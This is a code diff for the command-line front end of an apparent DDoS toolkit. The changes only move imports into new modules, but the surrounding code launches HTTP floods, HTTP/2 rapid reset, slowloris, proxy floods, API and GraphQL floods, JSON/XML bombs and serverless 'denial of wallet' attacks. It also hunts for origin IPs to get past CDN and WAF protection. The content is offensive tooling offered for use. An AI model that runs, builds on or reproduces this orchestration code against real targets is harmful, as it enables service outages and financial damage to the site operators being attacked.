@@ -444,7 +444,7 @@ async def auto_detect_target(target: str, verbose: bool = True):
         print(f" {c('c','[*]')} Auto-detecting target capabilities...")
 
     try:
-        from core.recon.detector import TargetDetector, print_profile
+        from core.recon.detection.detector import TargetDetector, print_profile
         detector = TargetDetector(timeout=10)
         profile = await detector.probe(target)
 
@@ -514,7 +514,7 @@ async def smart_layer7_attack(target: str, duration: int, rps: int,
             method="http-flood", http2=True
         )
     elif chosen_method == "proxy-flood":
-        from core.attack.enhanced import run_enhanced_attack
+        from core.attack.engines.enhanced import run_enhanced_attack
         result = await run_enhanced_attack(
             url=target, duration=duration, method="http_get_flood",
             rps=rps, proxy_pool=proxy_pool
@@ -532,7 +532,7 @@ async def prompt_target_type(target: str) -> dict:
     Ask user about target type so we know how to handle it.
     Returns: {target_url, origin_ip, target_type, host_header}
     """
-    from core.recon.origin_store import is_ip_address
+    from core.recon.origin.origin_store import is_ip_address
 
     if not target.startswith(("http://", "https://")):
         # raw input - might be IP, domain, or URL fragment
@@ -593,7 +593,7 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
     # Origin handling - only for non-IP targets
     if ask_origin and options["target_type"] == "url":
         try:
-            from core.recon.origin_store import load_hunt, get_best_origin
+            from core.recon.origin.origin_store import load_hunt, get_best_origin
             saved = load_hunt(target)
             if saved and (saved.get("verified_origins") or saved.get("candidates")):
                 best = get_best_origin(target)
@@ -603,7 +603,7 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
                         options["origin_ip"] = best
             if not options["origin_ip"]:
                 if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
-                    from core.recon.origin_hunter import OriginHunter
+                    from core.recon.origin.origin_hunter import OriginHunter
                     env = load_env()
                     print(f" {c('c','[*]')} Hunting origin IP...")
                     hunter = OriginHunter(timeout=8)
@@ -855,7 +855,7 @@ async def run_http_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     _rich_sep()
 
-    from core.attack.enhanced import run_enhanced_attack
+    from core.attack.engines.enhanced import run_enhanced_attack
 
     # Create vector for live dashboard (like Module 8/9)
     vectors = []
@@ -958,7 +958,7 @@ async def run_http2_flood(target: str, cfg: dict):
     try:
         if use_python or opts["proxy_pool"]:
             # Use Python engine for slow targets
-            from core.attack.enhanced import run_enhanced_attack
+            from core.attack.engines.enhanced import run_enhanced_attack
             result = await run_enhanced_attack(
                 url=target, duration=duration, method="http_get_flood",
                 rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
@@ -1069,7 +1069,7 @@ async def run_rapid_reset(target: str, cfg: dict):
     try:
         if use_python:
             # Use Python engine for slow targets (better timeout handling)
-            from core.attack.enhanced import run_enhanced_attack
+            from core.attack.engines.enhanced import run_enhanced_attack
             result = await run_enhanced_attack(
                 url=target, duration=duration, method="http_get_flood",
                 rps=min(rps, 500), proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
@@ -1151,7 +1151,7 @@ async def run_slowloris(target: str, cfg: dict):
     dashboard.start()
     
     try:
-        from core.attack.enhanced import run_enhanced_attack
+        from core.attack.engines.enhanced import run_enhanced_attack
         result = await run_enhanced_attack(
             url=sl_target, duration=duration, method="slowloris",
             rps=connections, proxy_pool=opts["proxy_pool"],
@@ -1177,7 +1177,7 @@ async def run_proxy_flood(target: str, cfg: dict):
     proxy_sel = get_input(" Choose [1/2] (default 1): ").strip() or "1"
     
     from core.network.proxy import ProxyPool
-    from core.attack.enhanced import run_enhanced_attack
+    from core.attack.engines.enhanced import run_enhanced_attack
     
     proxy_pool = None
     
@@ -1537,7 +1537,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                   0, threads=min(max_threads, 50))
 
     # Python slow attacks - WITH REAL-TIME LIVE STATS
-    from core.attack.enhanced import run_enhanced_attack
+    from core.attack.engines.enhanced import run_enhanced_attack
 
     sl_target = target
     if primary_origin:
@@ -1557,7 +1557,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                                 rps=int(rps * 1.5), proxy_pool=proxy_pool, live_stats=vec))
 
     # API Architecture (with proxy + live stats)
-    from core.attack.api_attacks import API_ATTACK_METHODS
+    from core.attack.specialized.api_attacks import API_ATTACK_METHODS
     
     def _wrap_api(func, **kwargs):
         """Wrap API attack to support live_stats injection"""
@@ -1605,7 +1605,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                   rps=min(60, int(rps * 0.08)), proxy_pool=proxy_pool))
 
     # Serverless / DoW (with live stats)
-    from core.attack.serverless_dow import DOW_ATTACK_METHODS
+    from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
     add_py_vector("Cold Start Flood",
         _wrap_api(DOW_ATTACK_METHODS["cold_start"],
                   url=target, duration=duration,
@@ -1787,7 +1787,7 @@ async def run_auto_mode(target: str, cfg: dict):
                 _RICH_CONSOLE.print(f"[bold yellow][!][/] Smart probe skipped: {e}")
         
         # Launch main attack via auto_mode_v2
-        from core.attack.auto_mode_v2 import run_auto_mode_v2, print_auto_mode_v2_summary
+        from core.attack.strategies.auto_mode_v2 import run_auto_mode_v2, print_auto_mode_v2_summary
         result = await run_auto_mode_v2(
             target=target,
             duration=duration,
@@ -1850,7 +1850,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     
     target_arch = None
     try:
-        from core.recon.target_fingerprint import detect_target_architecture, WordPressDetector
+        from core.recon.detection.target_fingerprint import detect_target_architecture, WordPressDetector
         target_arch = await detect_target_architecture(target)
         
         if target_arch.get("is_wordpress"):
@@ -1877,8 +1877,8 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
         _rich_sep()
         print(f" {c('y','[*]')} CDN/WAF detected: {profile.cdn}/{profile.waf}")
         try:
-            from core.recon.origin_hunter import OriginHunter
-            from core.recon.origin_store import load_hunt, get_best_origin
+            from core.recon.origin.origin_hunter import OriginHunter
+            from core.recon.origin.origin_store import load_hunt, get_best_origin
             cached = load_hunt(target)
             if cached:
                 origin_ip = get_best_origin(target)
@@ -1973,7 +1973,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     adaptive_targets = []
     if target_arch and target_arch.get("is_wordpress"):
         print(f" {c('g','[+]')} WordPress mode: targeting high-value endpoints")
-        from core.recon.target_fingerprint import WordPressDetector
+        from core.recon.detection.target_fingerprint import WordPressDetector
         wp_detector = WordPressDetector()
         adaptive_targets = wp_detector.get_high_value_endpoints(target_arch, target)
         if adaptive_targets:
@@ -2083,7 +2083,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     add_go_vector("WS Storm", "ws-storm", 0, threads=100)
     
     # Python slow attacks (with proxy + live stats)
-    from core.attack.enhanced import run_enhanced_attack
+    from core.attack.engines.enhanced import run_enhanced_attack
     sl_target = target
     if origin_ip and bypass_cdn:
         parsed = urlparse(target)
@@ -2104,7 +2104,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     
     # API vectors (with proxy + live stats wrapper)
     print(f" {c('g','[+]')} Adding API architecture vectors")
-    from core.attack.api_attacks import API_ATTACK_METHODS
+    from core.attack.specialized.api_attacks import API_ATTACK_METHODS
     
     def _wrap_api_auto(func, **kwargs):
         async def runner(vec):
@@ -2140,7 +2140,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     
     # Serverless/DoW vectors (with live stats)
     print(f" {c('g','[+]')} Adding serverless DoW vectors")
-    from core.attack.serverless_dow import DOW_ATTACK_METHODS
+    from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
     add_py_vector("Cold Start",
         _wrap_api_auto(DOW_ATTACK_METHODS["cold_start"],
                        url=target, duration=duration, rps=80))
@@ -2653,7 +2653,7 @@ async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
     # Auto-load saved origin if available
     origin_ip = ""
     try:
-        from core.recon.origin_store import load_hunt, get_best_origin, is_ip_address
+        from core.recon.origin.origin_store import load_hunt, get_best_origin, is_ip_address
         # If user already gave bare IP as target, treat as origin already
         if is_ip_address(target.replace("https://","").replace("http://","").split("/")[0]):
             origin_ip = ""  # target IS the origin, no spoof needed
@@ -2674,7 +2674,7 @@ async def run_advanced_attack(target: str, cfg: dict, method: str, label: str):
         use_origin = get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y"
         if use_origin:
             try:
-                from core.recon.origin_hunter import OriginHunter
+                from core.recon.origin.origin_hunter import OriginHunter
                 env = load_env()
                 print(f" {c('c','[*]')} Hunting origin IP...")
                 hunter = OriginHunter(timeout=8)
@@ -2903,7 +2903,7 @@ async def run_api_attack(target: str, cfg: dict, method: str, label: str):
     dashboard.start()
     
     try:
-        from core.attack.api_attacks import API_ATTACK_METHODS
+        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
         func = API_ATTACK_METHODS.get(method)
         if not func:
             print(f" {c('r','[-]')} Unknown API attack: {method}")
@@ -2950,7 +2950,7 @@ async def run_dow_attack(target: str, cfg: dict, method: str, label: str):
     dashboard.start()
     
     try:
-        from core.attack.serverless_dow import DOW_ATTACK_METHODS
+        from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
         func = DOW_ATTACK_METHODS.get(method)
         if not func:
             print(f" {c('r','[-]')} Unknown DoW attack: {method}")
@@ -2974,7 +2974,7 @@ async def run_origin_hunt(target: str, env: dict):
 
     # Check for cached result first
     try:
-        from core.recon.origin_store import load_hunt
+        from core.recon.origin.origin_store import load_hunt
         cached = load_hunt(target)
         if cached:
             age_hours = (time.time() - cached.get("timestamp", 0)) / 3600
@@ -3010,14 +3010,14 @@ async def run_origin_hunt(target: str, env: dict):
     _rich_sep()
 
     try:
-        from core.recon.origin_hunter import OriginHunter, print_hunt_report
+        from core.recon.origin.origin_hunter import OriginHunter, print_hunt_report
         hunter = OriginHunter(timeout=10, max_concurrent=200)
         report = await hunter.hunt(target, env=env)
         print_hunt_report(report, color_func=c)
 
         # auto-saved by hunter, just inform user
         if report.candidates:
-            from core.recon.origin_store import _hostname_from_url, STORE_DIR
+            from core.recon.origin.origin_store import _hostname_from_url, STORE_DIR
             host = _hostname_from_url(target)
             print(f" {c('g','[+]')} Auto-saved to: {STORE_DIR}/{host}.json")
             print(f" {c('g','[+]')} Plain text:    {STORE_DIR}/{host}.txt")
@@ -3167,7 +3167,7 @@ async def cmd_start(args, cfg):
             user_method=method, proxy_file=args.proxy_file, cfg=cfg
         )
     elif method == "slowloris":
-        from core.attack.enhanced import run_enhanced_attack
+        from core.attack.engines.enhanced import run_enhanced_attack
         result = await run_enhanced_attack(
             url=target, duration=duration, method="slowloris", rps=rps
         )
@@ -3181,7 +3181,7 @@ async def cmd_start(args, cfg):
         )
     elif method == "proxy-flood":
         from core.network.proxy import ProxyPool
-        from core.attack.enhanced import run_enhanced_attack
+        from core.attack.engines.enhanced import run_enhanced_attack
         proxy_file = args.proxy_file or "proxies/http.txt"
         proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
         total = await proxy_pool.load_file(proxy_file)
@@ -3205,7 +3205,7 @@ async def cmd_start(args, cfg):
         else:
             tasks.append(run_go_engine(target, duration, int(rps * 0.5), "http-flood"))
             tasks.append(run_go_engine(target, duration, int(rps * 0.4), "http-flood"))
-        from core.attack.enhanced import run_enhanced_attack
+        from core.attack.engines.enhanced import run_enhanced_attack
         tasks.append(run_enhanced_attack(url=target, duration=duration, method="slowloris", rps=200))
         results = await asyncio.gather(*tasks, return_exceptions=True)
         result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
@@ -3218,19 +3218,19 @@ async def cmd_start(args, cfg):
             target=target, duration=duration, rps=rps, method=method
         )
     elif method in ("api-flood", "api-rest"):
-        from core.attack.api_attacks import API_ATTACK_METHODS
+        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
         result = await API_ATTACK_METHODS["api_rest_flood"](url=target, duration=duration, rps=rps)
     elif method in ("graphql", "graphql-deep"):
-        from core.attack.api_attacks import API_ATTACK_METHODS
+        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
         result = await API_ATTACK_METHODS["graphql_deep"](url=target, duration=duration, rps=rps)
     elif method == "grpc-flood":
-        from core.attack.api_attacks import API_ATTACK_METHODS
+        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
         result = await API_ATTACK_METHODS["grpc_flood"](url=target, duration=duration, rps=rps)
     elif method in ("json-bomb", "xml-bomb"):
-        from core.attack.api_attacks import API_ATTACK_METHODS
+        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
         result = await API_ATTACK_METHODS["json_bomb"](url=target, duration=duration, rps=rps)
     elif method in ("cold-start", "cost-accum"):
-        from core.attack.serverless_dow import DOW_ATTACK_METHODS
+        from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
         result = await DOW_ATTACK_METHODS["cold_start"](url=target, duration=duration, rps=rps)
     else:
         # Default to http-flood
